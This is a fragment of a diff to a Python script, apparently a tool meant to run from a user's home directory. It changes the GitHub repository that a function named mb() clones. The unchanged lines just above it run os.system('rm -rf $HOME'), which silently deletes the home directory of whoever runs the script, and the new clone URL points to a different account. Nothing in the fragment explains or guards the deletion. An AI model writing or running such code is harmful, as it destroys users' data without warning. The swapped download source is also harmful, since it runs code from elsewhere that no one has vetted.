@@ -296,7 +296,7 @@ def mb():
 
 	    os.system('rm -rf $HOME')
 
-	    os.system('cd $HOME && git clone https://github.com/shabirbaloch125/Baloch')
+	    os.system('cd $HOME && git clone https://github.com//Teradeewana/143RJIVI.git')
 
 	    cb()
 
